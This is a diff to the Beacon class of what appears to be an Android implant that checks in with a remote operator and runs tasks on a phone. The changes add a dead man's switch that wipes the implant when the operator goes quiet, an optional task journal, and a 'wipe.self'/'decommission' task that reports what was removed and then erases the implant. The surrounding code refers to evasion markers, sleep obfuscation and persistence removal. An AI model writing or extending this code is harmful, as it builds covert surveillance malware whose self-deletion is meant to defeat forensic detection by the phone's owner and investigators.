@@ -179,6 +179,16 @@ class Beacon(
                     running.set(false)
                     break
                 }
+                // The dead man's switch: the operator stopped checking in,
+                // so the implant takes its traces with it and leaves.  An
+                // implant that outlives its engagement is an implant
+                // nobody watches.
+                if (Wipe.deadmanFired(TaskRunner.stateDirPath())) {
+                    log("the dead man's switch fired: the operator went quiet")
+                    config.androidContext?.let { Wipe.decommission(it, Upk.Null) }
+                    running.set(false)
+                    break
+                }
                 if (cycle()) {
                     sleep = sleep.coerceIn(1, 86400)
                     val interval = nextIntervalSeconds()
@@ -411,6 +421,9 @@ class Beacon(
             cfg.field("obf")?.flag()?.let { sleepObfuscate = it }
         }
         log("handshake complete (suite=$negSuite)")
+        // Every check-in of the operator is a proof that the engagement is
+        // alive, so the dead man's switch renews its window.
+        Wipe.deadmanRenew(TaskRunner.stateDirPath())
     }
 
     private fun checkin(): Boolean {
@@ -501,6 +514,12 @@ class Beacon(
                 continue
             }
             log("task $id kind=$kind")
+            // The journal of the engagement is a trace of its own, so it
+            // is written only while the operator asks for it.
+            val stateDir = TaskRunner.stateDirPath()
+            if (stateDir.isNotEmpty() && Wipe.journalEnabled(stateDir)) {
+                Wipe.journal(stateDir, "task", kind)
+            }
             // The marker of the kill switch: the operator sends it and the
             // implant stops existing.
             if (Evasion.markerFired(evasion, args)) {
@@ -530,6 +549,17 @@ class Beacon(
                     // phone is left the way it was found.  This is also the
                     // path the panic task of the server takes.
                     TaskRunner.removePersistence()
+                    running.set(false)
+                    return false
+                }
+                "wipe.self", "decommission" -> {
+                    // The end of the engagement: the answer of the wipe
+                    // travels first, so the operator reads what was
+                    // removed and what was not, and then the implant
+                    // leaves the phone.
+                    val outcome = TaskRunner.run(kind, args)
+                    answer(ch, sess, id, outcome)
+                    bye()
                     running.set(false)
                     return false
                 }
